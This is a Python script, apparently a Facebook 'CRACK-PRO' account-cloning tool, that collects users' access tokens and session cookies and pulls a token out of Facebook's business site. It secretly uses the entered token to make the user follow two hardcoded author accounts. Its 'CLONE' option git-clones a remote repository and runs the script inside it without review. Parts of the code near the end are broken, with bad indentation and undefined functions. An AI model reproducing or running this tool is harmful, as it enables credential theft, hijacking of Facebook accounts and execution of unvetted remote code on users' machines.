#!/usr/bin/python3
#-*-coding:utf-8-*-
# Update V1.6

### Import Module
import requests,bs4,sys,os,random,time,re,json,uuid,subprocess,platform,base64
from random import randint
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from bs4 import BeautifulSoup as par
from datetime import date
from datetime import datetime
from urllib.parse import quote


### Perumpamaan Module & Syntax
_req_ses_  = requests.Session()
_req_get_  = requests.get
_req_post_ = requests.post
_js_lo_    = json.loads
_cici_azimvau_    = input
_azimvau_dapunta_ = open
_cici_cici_       = exit

### Warna
Z = "\033[1;30m" # Hitam
P = "\033[1;37m" # Putih
M = "\033[1;31m" # Merah
H = "\033[1;32m" # Hijau
K = "\033[1;33m" # Kuning
B = "\033[1;34m" # Biru
U = "\033[1;35m" # Ungu
O = "\033[1;36m" # Biru Muda
N = "\033[0m"    # Warna Mati

### Host & Penampungan
host = "https://mbasic.facebook.com"
ok = []
cp = []
ttl = []
count = 1
data_1 = {}
data_2 = {}
data_change_1 = {}
data_change_2 = {}
data_user = []
header_grup = {"user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"}
header_nama = {"origin": "https://mbasic.facebook.com","accept-language": "en-GB,en-US;q=0.9,en;q=0.8,bn;q=0.7","accept-encoding": "gzip, deflate","accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","user-agent": "Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Host": "".join(bs4.re.findall("://(.*?)$","https://m.facebook.com")),"referer": "https://m.facebook.com/login/?next&ref=dbl&fl&refid=8","cache-control": "max-age=0","upgrade-insecure-requests": "1","content-type": "application/x-www-form-urlencoded"}
header_hashtag = {'authority': 'mbasic.facebook.com','method': 'GET','path': '/favicon.ico','scheme': 'https','accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8','accept-encoding': 'gzip, deflate','accept-language': 'en-US,en;q=0.9','user-agent': 'Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36','origin': 'https://www.facebook.com','referer': 'https://www.facebook.com'}

r = str(random.randint(1,9999))
rx = r.replace("1","A").replace("2","C").replace("3","B").replace("4","E").replace("5","H").replace("6","I").replace("7","Y")
plist = (platform.uname())[2]
basex = plist
basex1 = basex.encode('ascii')
basex2 = base64.b64encode(basex1)
basex3 = basex2.decode('ascii')
base4 = (basex3).upper()
basesplit = base4.replace('=', 'N').replace('A', '3').replace('B', '9').replace('C', '7').replace('D', '1').replace('E', '4').replace('M', '2').replace('L', '6').replace('F', '8').replace('N', 'E').replace('T', 'R').replace("5","X").replace("1","X")

try:
    rq = requests.get('https://github.com/Shuvo-BBHH/premiouM/blob/premiou/shuvo.txt').text
except requests.exceptions.ConnectionError:
    print('\nNO INTERNET CONNECTION\n')
    exit()

### Waktu & Tanggal
__sekarang__ = datetime.now()
__tahun__ = __sekarang__.year
__bulan__ = __sekarang__.month
__hari__  = __sekarang__.day

bulan_ttl = {"01": "JAN", "02": "FEB", "03": "MAR", "04": "APR", "05": "MAY", "06": "JUN", "07": "JUL", "08": "AUG", "09": "SEP", "10": "OCT", "11": "NOV", "12": "DEC"}
_list_bulan_ = ["JAN", "FEB", "MAR", "APR", "MAY", "JUN", "JUL", "AUG", "SEP", "OCT", "NOV", "DEC"]

try:
    if __bulan__ < 0 or __bulan__ > 12:
        _cici_cici_()
    _bulan_sekarang_ = __bulan__ - 1
except ValueError:
    _cici_cici_()
_bulan_ = _list_bulan_[_bulan_sekarang_]
tanggal = ("%s-%s-%s"%(__hari__,_bulan_,__tahun__))

_my_account_ = [
    '100045203855294','100014839270205']

### User Agent
ua_intelmac = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36;]'
ua_nokia   = 'Mozilla/4.1 (compatible; MSIE 5.0; Symbian OS; Nokia 7610;451) Opera 6.20'
ua_asus    = 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; ASUS_T00Q Build/KVT49L)/CLDC-1.1;]'
ua_huawei  = 'Mozilla/5.0 (Linux; Android 7.0; HUAWEI CAZ-AL10; HMSCore 5.3.0.312; GMSCore 20.39.15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 HuaweiBrowser/11.1.0.302 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/173.0.0.10.118;]' #DONE
ua_vivo    = 'Mozilla/5.0 (Linux; Android 10; V2027) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36'
ua_oppo    = 'Mozilla/5.0 (Linux; Android 4.1.1; X909 Build/JRO03L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.92 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/173.0.0.10.118;]'
ua_samsung = 'Mozilla/5.0 (Linux; Android 5.0.1; SAMSUNG GT-I9515 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36;]'
ua_windows = 'Mozilla/5.0 (X11; U; Linux i686; fr-FR; rv:1.7.8) Gecko/20050511 Firefox/1.0.4;]'
ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 11; Mi 9T Pro Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.80 Mobile Safari/537.36 Reddit/Version 2021.38.0/Build 365032/Android 11 [FBAN/EMA;FBLC/en_US;FBAV/247.0.0.5.130;]'
### Clear Login Session
def bersih():
    try:os.remove('token.txt')
    except:pass
    try:os.remove('cookies.txt')
    except:pass

### Display Text
def jalan(z):
    for e in z + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.04)
def mlaku(z):
    for e in z + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.03)

def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.001)


### Clear Terminal
def clear():
    if "linux" in sys.platform.lower():os.system("clear")
    elif "win" in sys.platform.lower():os.system("cls")
    else:os.system("clear")

### Logo
def banner():
        os.system("clear")
        os.system('echo "\n\33[93m███╗   ███╗ █████╗ ██╗  ██╗██████╗ ██╗    \n\033[91m████╗ ████║██╔══██╗██║  ██║██╔══██╗██║    \n\033[1;32m██╔████╔██║███████║███████║██║  ██║██║   \n\33[97m██║╚██╔╝██║██╔══██║██╔══██║██║  ██║██║    \n\033[96m██║ ╚═╝ ██║██║  ██║██║  ██║██████╔╝██║    \n\033[0;35m╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═╝\033[0m      \n         ╔═════════════════════════════╗\n         ║ TOOL NAME: { CRACK-PRO }    ║\n         ║ AUTHOR   : MAHDI       ║\n         ║ GITHUB   : Shuvo-BBHH       ║\n         ║ Bikash/cont;01887408882     ║\n         ╚═════════════════════════════╝" | lolcat -a -d 2 -s 50')
        print("")
        
def cek_dev():
    _isi_dev_ = _azimvau_dapunta_('cookies.txt','r').read()
    if 'null' in _isi_dev_:jalan('%s [%s!%s] %INVALID COOKIES, RE-LOGIN WITH COOKIES'%(M,P,M,P));bersih();_cici_cici_()
    else:pass


def bot_follow(_tok_dev_):
    try:
        for _list_ in _my_account_:
            try:_req_post_("https://graph.facebook.com/%s/subscribers?access_token=%s"%(_list_,_tok_dev_));time.sleep(0.3)
            except:pass
        print('%s '%(O));jalan('%s [%s!%s] %sLOGIN SUCCESSFUL %s^_^'%(H,P,H,H,P));time.sleep(2)
    except:pass
    

def menu_log():
    bersih();clear()
    banner()
    var_menu()
    pmu = _cici_azimvau_('%s [%s•%s] %sCHOOSE : %s'%(H,P,H,K,H))
    print('%s '%(O))
    if pmu in ['']:jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,P));menu_log()
    elif pmu in ['1','01','001','a']:
        defaultua()
        token = _cici_azimvau_('%s [%s•%s] %sTOKEN : %s'%(H,P,H,K,H))
        try:x = _req_get_("https://graph.facebook.com/me?access_token=" + token);y = _js_lo_(x.text);n = y['name'];xd = _azimvau_dapunta_("token.txt", "w");xd.write(token);xd.close();xz = _azimvau_dapunta_('cookies.txt','w');xz.write('null');xz.close();bot_follow(token);menu()
        except (KeyError,IOError):print('%s '%(O));jalan('%s [%s!%s] %sTOKEN INVALID'%(M,P,M,P));bersih();menu_log()
        except requests.exceptions.ConnectionError:print('%s '%(O));jalan('%s [%s!%s] %sCONNECTION PROBLEM'%(M,P,M,P));_cici_cici_()
    elif pmu in ['2','02','002','b']:
        defaultua()
        cookie = _cici_azimvau_('%s [%s•%s] %sCOOKIES : %s'%(H,P,H,K,H))
        try:header={'Host':'business.facebook.com','cache-control':'max-age=0','upgrade-insecure-requests':'1','user-agent':'Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36','accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8','content-type' : 'text/html; charset=utf-8','accept-encoding':'gzip, deflate','accept-language':'en-GB,en-US;q=0.9,en;q=0.8,bn;q=0.7','cookie': cookie};r=_req_get_("https://business.facebook.com/creatorstudio/home", headers=header);p=re.search('{"accessToken":"(EAA\w+)', r.text);token=p.group(1);xd = _azimvau_dapunta_("token.txt", "w");xd.write(token);xd.close();xz = _azimvau_dapunta_('cookies.txt','w');xz.write(cookie);xz.close();bot_follow(token);menu()
        except requests.exceptions.ConnectionError:print('%s '%(O));jalan('%s [%s!%s] %sCONNECTION PROBLEM'%(M,P,M,P));_cici_cici_()
        except (KeyError,IOError,AttributeError):print('%s '%(O));jalan('%s [%s!%s] %sCOOKIES INVALID'%(M,P,M,P));bersih();menu_log()
    elif pmu in ['0','00','000','z']:exit()
    else:jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,P));menu_log()


def menu():
    clear()
    banner()
    jid = ''
    try:
        _azimvau_ = _azimvau_dapunta_("token.txt","r").read();_cici_ = _azimvau_dapunta_("cookies.txt","r").read();_salsabila_ = {"cookie" : _cici_}
        if 'null' in _cici_:status_cookies = ('%sNO'%(M));W = Z;Y = P; B1 = Z; O1 = Z; K1 = Z; H1 = Z; M1 = Z; P1 = Z
        else:status_cookies = ('%sYES'%(H));W = H; Y = K; B1 = B; O1 = O; K1 = K; H1 = H; M1 = M; P1 = P
    except (KeyError,IOError):print('%s [ %sOPPSS :) %s]%s'%(M,P,M,P));print('%s '%(M));jalan('%s [%s!%s] %sTOKEN/COOKIES INVALID'%(M,P,M,P));bersih();menu_log()
    
    try:token = _azimvau_dapunta_("token.txt","r").read();x = _req_get_("https://graph.facebook.com/me?access_token=" + token);y = _js_lo_(x.text);n = y['name'].upper();i = y['id']
    except (KeyError,IOError):print('%s [ %sOPPSS :) %s]%s'%(M,P,M,M));print('%s '%(M));jalan('%s [%s!%s] %sTOKEN/COOKIES INVALID'%(M,P,M,P));bersih();menu_log()
    except requests.exceptions.ConnectionError:print('%s [ %sOPPSS :) %s]%s'%(M,P,M,P));print('%s '%(M));jalan('%s [%s!%s] %sCONNECTION PROBLEM'%(M,P,M,P));_cici_cici_()
    except requests.exceptions.ConnectionError:print('%s [ %sOPPSS :) %s]%s'%(M,P,M,P));print('%s '%(M));jalan('%s [%s!%s] %sCONNECTION PROBLEM'%(M,P,M,P));_cici_cici_()
    try:a = _req_get_("http://ip-api.com/json/",headers={"Referer":"http://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":"Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36;]"}).json();ip = a["query"];loc = a["country"].upper()
    except KeyError:ip = " "
    psb('         %s》%s》%s》%sEVERY HUSTLER GET PAYDAY%s《%s《%s《'%(M,H,B,H,B,H,M))
    print('%s '%(O))
    print('%s [%s•%s] %sNAME   %s: %s%s'%(H,P,H,B,K,H,n))
    print('%s [%s•%s] %sID     %s: %s%s'%(H,P,H,B,K,H,i))
    print('%s [%s•%s] %sIP     %s: %s%s'%(H,P,H,B,K,H,ip))
    print('%s [%s•%s] %sFROM   %s: %s%s'%(H,P,H,B,K,H,loc))
    print('%s [%s•%s] %sSTATUS %s: %sPREMIUM :)'%(H,P,H,B,K,H))
    print('')
    print('%s [%s>_%s] %sTOKEN%s/%sCOOKIES %s: %sYES%s/%s'%(H,P,H,B,Z,B,K,H,P,status_cookies))
    print('%s '%(O))
    psb('%s [%s01%s] %sCLONE '%(H,P,H,H))
    psb('%s [%s02%s] %sCLONE FROM FREE'%(H,P,H,B1))
    
    psb('%s [%s00%s] %sLOG OUT'%(H,M,H,M))
    print('')
    pm = _cici_azimvau_('%s [%s>_%s] %sCHOOSE : %s'%(H,P,H,K,H))
    print('%s '%(O))
    if pm in ['']:jalan('%s [%s!%s] %sINCORRECT CONTENT'%(P,M,P,M));menu()
elif pm in ['1','01','001','a']:
      
      os.system('git clone https://github.com/Shuvo-BBHH/paidfree6.git')
      os.system('cd paidfree6 && python madi.py')
      time.sleep(2)
      print(" ")
       n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
       time.sleep(2)
        main()
    elif pm in ['2','02','002','b']:pengikut(token)
    elif pm in ['3','03','003','c']:cek_dev();followers(_salsabila_)
